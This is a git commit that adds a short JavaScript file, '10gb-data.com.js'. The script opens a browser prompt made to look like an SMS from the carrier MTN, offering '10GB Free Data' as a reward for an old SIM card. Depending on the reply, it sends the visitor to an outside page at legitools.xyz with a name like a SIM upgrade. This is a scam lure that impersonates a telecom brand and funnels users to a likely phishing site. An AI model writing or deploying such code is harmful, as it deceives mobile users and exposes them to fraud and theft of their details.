2e0efb4479bc4c97bf31f5169f427c9829f92199
harryjohnson86 <mfonjohnson86@gmail.com>
2025-07-03 18:06:11 -0700

    Create 10gb-data.com.js

---
+++ 10gb-data.com.js
@@ -0,0 +1,5 @@
+var password = 'Mtn 10GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 10GB Free Data OLD SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','Mtn 10GB Free Data');
+if (password != 'Mtn 10GB Free Data') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
